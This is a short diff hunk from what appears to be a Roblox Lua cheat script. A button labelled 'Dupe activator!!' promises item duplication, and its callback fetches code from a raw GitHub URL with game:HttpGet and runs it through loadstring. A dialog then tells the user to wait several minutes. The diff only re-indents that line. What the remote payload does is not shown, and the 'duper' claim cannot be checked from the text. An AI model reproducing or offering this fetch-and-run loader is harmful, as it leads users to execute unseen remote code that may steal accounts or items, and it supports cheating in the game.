@@ -43,7 +43,7 @@ do
         Title = "Dupe activator!!",
         Description = "starts the duper (REQUIRED)",
         Callback = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptingMadeEZ/mm2DupeScriptEz/refs/heads/main/loading%20screen%20(ty%20arko!)"))();
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptingMadeEZ/mm2DupeScriptEz/refs/heads/main/loading%20screen%20(ty%20arko!)"))();
             Window:Dialog({
                 Title = "executed!",
                 Content = "now wait 5-10 mins",
